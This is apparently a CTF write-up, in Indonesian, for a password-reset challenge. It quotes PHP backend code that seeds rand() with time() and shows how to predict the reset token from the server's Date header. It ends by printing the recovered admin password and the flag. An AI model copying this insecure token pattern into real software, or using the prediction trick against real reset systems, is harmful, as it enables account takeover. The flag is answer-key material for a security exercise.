<h1>Password reset</h1>
<h3>Description</h3>
<label>http://challenges.ringzer0ctf.com:10113/</label>
<h3>Solution</h3>
<label>Source code backend halaman</label>

```php
if(isset($_POST['reset_username'])) {
		srand(time());
		$token = rand(1000000000000000,9999999999999999);
		$success = '<div class="success">Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...
		$hSql->FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR']));
		$hSql->FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));
}

if(URL_HANDLE::GetInstance()->get->k != null) {
		$result = reset($hSql->FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()->get->k)));
		if($hSql->RowCount() != 0) {
				if($result->expired_time > time()) {
						$success = '<div class="success">Here\'s your new password: XXXXXXXXXXXXXX</div>';
				} else {
						$success = '<div class="error">Expired recovery key!</div>';
				}
		} else {
				$success = '<div class="error">Invalid recovery key!</div>';
		}
}
```
<label>reset password username=admin, maka muncul date "Mon, 06 Oct 2025 19:47:45 -0400" GMT-4/UTC-4, jadikan waktu UTC dengan +4 jam = Mon, 06 Oct 2025 23:47:45</label>
<label>get timestamp ke https://www.epochconverter.com/, maka didapat timestamp 1759794465 untuk seeder token<label>

```php
<?php
srand(1759794465);
$token = rand(1000000000000000,9999999999999999);
echo $token //hasil = 7796136442571879
?>
```
<h5>Harus PHP7.0 jika tidak hasil seeder berbeda</h5>
<label>request key token ke url http://challenges.ringzer0ctf.com:10113/?k=7796136442571879, maka didapat password Thi%P@s50rD!sM1n3* dan lanjut login admin untuk mendapatkan flag<label>
<h3>Flag</h3>
<pre>
FLAG-DlwwTV7vCQf4Dn281Yhb802x5U
</pre>
